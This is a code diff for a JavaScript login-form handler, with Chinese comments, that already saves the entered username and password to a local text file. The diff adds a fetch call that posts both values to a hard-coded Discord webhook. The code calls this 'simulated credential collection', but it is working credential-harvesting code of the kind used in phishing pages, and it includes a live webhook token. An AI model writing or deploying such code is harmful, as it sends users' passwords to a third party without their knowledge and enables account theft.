@@ -15,12 +15,29 @@ document.addEventListener("DOMContentLoaded", () => {
 
         alert("登入成功！（模擬）\n帳號：" + username + "\n密碼：" + password);
 
+        // 儲存為本地檔案
         const accountData = `帳號: ${username}\n密碼: ${password}\n`;
-
         const blob = new Blob([accountData], { type: 'text/plain' });
         const link = document.createElement('a');
         link.href = URL.createObjectURL(blob);
         link.download = 'account.txt';
         link.click();
+
+        // 傳送到 Discord Webhook
+        const webhookURL = "https://discord.com/api/webhooks/1380062024582692935/3_1l1EnLTwsSR1uH15wUhb1jdg-5DE4IZ-OLNbYcrRh9KWlE65RM9KZfIaVwPoW1xLQj";
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                content: `📥 模擬帳密收集\n👤 帳號：${username}\n🔐 密碼：${password}`
+            }),
+        }).then(() => {
+            console.log("已送出至 Discord Webhook");
+        }).catch((error) => {
+            console.error("Webhook 傳送失敗：", error);
+        });
     });
 });
